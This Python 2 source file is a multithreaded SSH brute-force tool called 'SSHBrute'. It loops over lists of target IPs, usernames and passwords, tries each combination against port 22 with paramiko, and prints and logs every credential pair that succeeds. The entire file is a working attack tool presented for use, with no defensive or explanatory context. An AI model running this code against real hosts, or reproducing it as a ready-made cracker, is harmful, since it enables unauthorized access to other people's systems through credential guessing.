import threading
import paramiko
import time
import traceback
import sys
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from optparse import OptionParser



class SSHBrute:
    def __init__(self):
        self.args_parser()
        self.success=[]
        self.error=[]
    def ssh_login(self, ip, usr, pwd):
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            # ssh.connect(self.targetIp, port=int(self.portNumber),username=self.username, password=self.password,timeout=int(self.timeoutTime), allow_agent=False, look_for_keys=False)
            if self.args.verbose:
                sys.stdout.write("Trying %s %s/%s                       \n" % (ip, usr, pwd))
                sys.stdout.flush()
            ssh.connect(ip, port=22, username=usr, password=pwd, timeout=10, allow_agent=False, look_for_keys=False)
            ssh.close()
            sys.stdout.write("Success! %s %s/%s                       \n"%(ip,usr,pwd))
            sys.stdout.flush()
            if self.args.out:
                f=open(self.args.out,'a')
                f.write("\033[0;32mSuccess! %s %s/%s                       \n\033[0m"%(ip,usr,pwd))
                f.close()
            self.success.append(ip)
            return True
        except paramiko.AuthenticationException:
            ssh.close()
            if self.args.verbose:
                sys.stdout.write("Faild %s %s/%s                       \n" % (ip, usr, pwd))
                sys.stdout.flush()
            return False
        except paramiko.SSHException: #this port maybe not ssh
            ssh.close()
            self.error.append(ip)
            return False
        except:
            traceback.print_exc()
            self.error.append(ip)
            return False

    def args_parser(self):
        self.optionParser = OptionParser(version="SSH Brute")
        self.optionParser.add_option('-I', dest='iplist', help='IP list')
        self.optionParser.add_option('-U', dest='userlist', help='Username list')
        self.optionParser.add_option('-P', dest='passlist', help='Password list')
        self.optionParser.add_option('-i', dest='ip', help='Single ip to attack')
        self.optionParser.add_option('-u', dest='username', help='Single username to attack')
        self.optionParser.add_option('-p', dest='password', help='Single password to attack')
        self.optionParser.add_option('-t', dest='thread', help='Number of threads  default:5')
        self.optionParser.add_option('-v', dest='verbose', action='store_true',help='Verbose')
        self.optionParser.add_option('-o', dest='out', help='Output file')
        (self.args, args) = self.optionParser.parse_args()

    def start_thread(self,ip,usr,pwd):
        if (ip in self.success) or (ip in self.error):
            return
        while True:
            if threading.active_count() < self.args.thread:
                t = threading.Thread(target=self.ssh_login, args=(ip, usr, pwd))
                t.daemon = True
                t.start()
                # t.join(1)
                sys.stdout.write("Current threads:%d success:%d error:%d\r" % (threading.active_count(), len(self.success), len(self.error)))
                sys.stdout.flush()
                return True
            else:
                time.sleep(1)
    def start_brute(self):
        if not self.args.thread:
            self.args.thread=5
        else:
            self.args.thread=int(self.args.thread)
        if self.args.iplist:
            if self.args.userlist:
                if self.args.passlist:#iplist userlist passlist
                    with open(self.args.userlist) as userlist:
                        for usr in userlist.readlines():
                            usr = usr.strip()
                            with open(self.args.passlist) as passlist:
                                for pwd in passlist.readlines():
                                    pwd=pwd.strip()
                                    with open(self.args.iplist) as iplist:
                                        for ip in iplist.readlines():
                                            ip=ip.strip()
                                            self.start_thread(ip,usr,pwd)
                elif self.args.password: #iplist userlist singlepass
                    with open(self.args.userlist) as userlist:
                        for usr in userlist.readlines():
                            usr = usr.strip()
                            with open(self.args.iplist) as iplist:
                                for ip in iplist.readlines():
                                    ip = ip.strip()
                                    self.start_thread(ip, usr, self.args.password)
                else:
                    print 'Too few arguments'
            elif self.args.username:
                if self.args.passlist: #iplist singleuser passlist
                    with open(self.args.passlist) as passlist:
                        for pwd in passlist.readlines():
                            pwd = pwd.strip()
                            with open(self.args.iplist) as iplist:
                                for ip in iplist.readlines():
                                    ip = ip.strip()
                                    self.start_thread(ip, self.args.username, pwd)
                elif self.args.password: #iplist singleuser singlepass
                    with open(self.args.iplist) as iplist:
                        for ip in iplist.readlines():
                            ip = ip.strip()
                            self.start_thread(ip, self.args.username, self.args.password)
                else:
                    print 'Too few arguments'
            else:
                print 'Too few arguments'
        elif self.args.ip:
            if self.args.userlist:
                if self.args.passlist:  # singleip userlist passlist
                    with open(self.args.userlist) as userlist:
                        for usr in userlist.readlines():
                            usr = usr.strip()
                            with open(self.args.passlist) as passlist:
                                for pwd in passlist.readlines():
                                    pwd = pwd.strip()
                                    self.start_thread(self.args.ip, usr, pwd)
                elif self.args.password: #singleip userlist singleip
                    with open(self.args.userlist) as userlist:
                        for usr in userlist.readlines():
                            usr = usr.strip()
                            self.start_thread(self.args.ip, usr, self.args.password)
                else:
                    print 'Too few arguments'
            elif self.args.username:
                if self.args.passlist:  # singleip singleuser passlist
                    with open(self.args.passlist) as passlist:
                        for pwd in passlist.readlines():
                            pwd = pwd.strip()
                            self.start_thread(self.args.ip, self.args.username, pwd)
                elif self.args.password:  # singleip singleuser singlepass
                    self.start_thread(self.args.ip, self.args.username, self.args.password)
                else:
                    print 'Too few arguments'
            else:
                print 'Too few arguments'
        while threading.active_count() != 1:
            sys.stdout.write("Current threads:%d success:%d error:%d\r" % (threading.active_count(), len(self.success), len(self.error)))
            sys.stdout.flush()
            time.sleep(1)
    def main(self):
        if not (self.args.iplist or self.args.ip):
            self.optionParser.print_help()
        elif (self.args.userlist and self.args.username):
            print 'Username list cannot be used with a single username'
        elif (self.args.passlist and self.args.password):
            print 'Password list cannot be used with a single password'
        elif (self.args.iplist and self.args.ip):
            print 'IP list cannot be used with a single ip'
        else:
            self.start_brute()
if __name__ == '__main__':
    run = SSHBrute()
    # run.ssh_login('127.0.0.1','root','123')
    run.main()
